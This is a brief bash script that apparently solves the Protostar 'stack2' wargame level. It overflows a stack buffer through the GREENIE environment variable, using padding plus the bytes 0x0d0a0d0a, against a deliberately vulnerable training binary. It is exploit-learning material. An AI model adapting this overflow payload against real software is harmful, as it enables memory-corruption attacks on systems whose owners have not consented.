#!/bin/bash
# Similar to stack1 the env-variable consists of 64 dummy characters for the buffer array and the four bytes containing information
# 0x0d0a0d0a (Litte-Endian) -> 0xa 0xd 0xa 0xd -> \n\r\n\r
export GREENIE="$(printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\r\n\r')"
/opt/protostar/bin/stack2
